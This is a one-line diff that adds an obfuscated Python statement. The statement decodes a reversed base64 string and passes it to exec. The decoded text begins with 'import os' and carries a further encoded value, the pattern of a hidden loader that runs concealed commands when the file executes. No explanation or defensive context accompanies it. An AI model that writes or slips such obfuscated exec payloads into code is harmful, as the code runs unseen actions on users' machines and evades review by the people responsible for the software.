@@ -1,0 +1,1 @@
+exec((lambda x : __import__('base64').b64decode(x[::-1]).decode('utf-8'))('==QKoU2cyVmdlJ3XuVnc7U2cyVmdlJ3XuVncgQncvBXbpBidlJ3Xk9Wbg02byZ2OpkyJ40iZ0V3JoUGZvNWZk5SKdFTL6ozWnEGSSBzYI1kNMlXO5lFWjVnWywGMhhkVpRGWOx2Yt5kdi5mUsJmbRVXWykDdMJjS5RGWShmYGdGdNRUU2J2V5sGZXhHbMJTMoF2V0YnYXlzaYNjSsRWa1cXZR1TPngSZk92YlRGN2ImL0YTZzFmYoQWYvxmb39GZuQXZnd3O0YTZzFmYsQXZndHLz9GI0J3bw1Wa'))
